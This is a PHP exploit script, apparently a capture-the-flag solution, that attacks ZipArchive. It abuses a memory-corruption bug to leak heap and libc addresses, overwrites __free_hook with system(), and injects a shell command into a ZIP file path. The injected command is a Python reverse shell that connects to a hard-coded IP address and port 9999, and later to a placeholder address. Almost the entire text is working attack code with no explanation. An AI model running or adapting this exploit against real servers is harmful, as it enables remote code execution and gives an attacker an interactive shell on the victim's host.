function strToHex($string) {
    $hex = '';
    for ($i = 0; $i < strlen($string); $i++) {
        $ord = ord($string[$i]);
        $hexCode = dechex($ord);
        $hex .= substr('0'.$hexCode, -2);
    }
    return strToUpper($hex);
}

function hexToStr($hex) {
    $string='';
    for ($i = 0; $i < strlen($hex)-1; $i += 2) {
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}

function expect($a, $b = true) {
    if ( $a === $b ) { } else {
        echo ("Expected equal, but was not.\n");
        var_dump($a);
        var_dump($b);
        die("...");
    }
}

$stderr = fopen('php://stderr', 'a');
fwrite($stderr, "hi_from_errolog\n");

$m = array_fill(0, 50, 0);
$la = 0;
$hl = 0;
$z = new ZipArchive();
$z->open("/tmp/aaarrr.zip", ZipArchive::CREATE);
$za = new ZipArchive();
$za->open("/tmp/baarrr.zip", ZipArchive::CREATE);
$zaa = new ZipArchive();
$zaa->open("/tmp/G;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"128.237.182.193\", 9999));f=os.dup2;f(s.fileno(),0);f(s.fileno(),1);f(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);';G.zip", ZipArchive::CREATE);

$x = new ZipArchive();
$x->open("/tmp/pppqqq.zip", ZipArchive::CREATE);
$x->addfromstring('flage', 'flage{isflage}');
$x->close();

$y = new ZipArchive();
$y->open("/tmp/pppbbb.zip", ZipArchive::CREATE);
$y->addfromstring('flage', 'flage{isflage}');
$y->close();

$y->open("/tmp/pppbbb.zip");
$x->open("/tmp/pppqqq.zip"); // set up filename
$x->open("/tmp/pppqqq.zip", ZipArchive::EXCL);
$x->open("/tmp/pppqqq.zip", ZipArchive::EXCL);
$y->close("/tmp/pppbbb.zip");

$y->open("/tmp/pppbbb.zip");
$x->open("/tmp/pppqqq.zip", ZipArchive::EXCL); 

$la=intval(strToHex(strrev($y->filename)), 16) - 0x6a0a0;
fwrite($stderr, ''.dechex($la)."\n");
print($la);
print("\n");

$lb = $la;
$y->comment;

$z->addfromstring('flage', pack("q", $la + 0x9f280 + 0x18));
$z->addfromstring('aaaaaaaaa', pack("q", $la + 0x9f280 + 0x10));
$z->addfromstring('bbbbbbbbb', pack("q", $la + 0x6a0a0));

$m[0]=intval(strToHex(strrev($y->filename)), 16) - 0x171e8;
fwrite($stderr, ''.dechex($m[0])."\n");
fwrite($stderr, ''.dechex(0x9f280)."\n");
print($m[0]);
print("\n");

$z->addfromstring('flage', pack("q", $la + 0x6a0b0));
$y->comment;
# $y->open("aaaa");

# $z->addfromstring('aaaaaaaaa', substr(pack("q", $m[0]), 0, -2));
# $z->addfromstring('flage', pack("q", $la + 0x81140 + 0x18));
# $z->addfromstring('ccccccccc', pack("q", $m[0]));
# $z->addfromstring('ddddddddd', pack("q", $la + 0x10b0));
##########################################################################


$xa = new ZipArchive();
$xa->open("/tmp/bppqqq.zip", ZipArchive::CREATE);
$xa->addfromstring('flage', 'flage{isflage}');
$xa->close();

$ya = new ZipArchive();
$ya->open("/tmp/bppbbb.zip", ZipArchive::CREATE);
$ya->addfromstring('flage', 'flage{isflage}');
$ya->close();

$ya->open("/tmp/bppbbb.zip");
$xa->open("/tmp/bppqqq.zip"); // set up filename
$xa->open("/tmp/bppqqq.zip", ZipArchive::EXCL);
$xa->open("/tmp/bppqqq.zip", ZipArchive::EXCL); 
$ya->close("/tmp/bppbbb.zip");

$ya->open("/tmp/bppbbb.zip"); // 0x10f0
$xa->open("/tmp/bppqqq.zip", ZipArchive::EXCL); 

$ya->comment;

$za->addfromstring('flage', pack("q", $la + 0x9f3c0 + 0x18));
$za->addfromstring('aaaaaaaaa', pack("q", $m[0]));
$za->addfromstring('bbbbbbbbb', pack("q", $la + 0x6a0d0));

$m[1]=intval(strToHex(strrev($ya->filename)), 16) - 0x9f7c0; // libc base
print($m[1]);
print("\n");
$ya->comment;

$za->addfromstring('flage', pack("q", $m[1] + 0x3ed8e8)); // free_hook
$za->addfromstring('zzzzz', 'AAAAAAAA');
# $za->addfromstring('bzzzz', pack("q", $m[1] + 0x4f322)); // one gadget on free hook
// $za->addfromstring('zzzzz', 'AAAAAAAA');
$za->addfromstring('sh', pack("q", $m[1] + 0x4f440));

$zaa->open("\/tmp\/G;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<<<<IPADDRESSTOCONNECT>>>>\", 9999));f=os.dup2;f(s.fileno(),0);f(s.fileno(),1);f(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);';B.zip", ZipArchive::EXCL);

$ya->comment;
$ya->open("aaaaaaa");

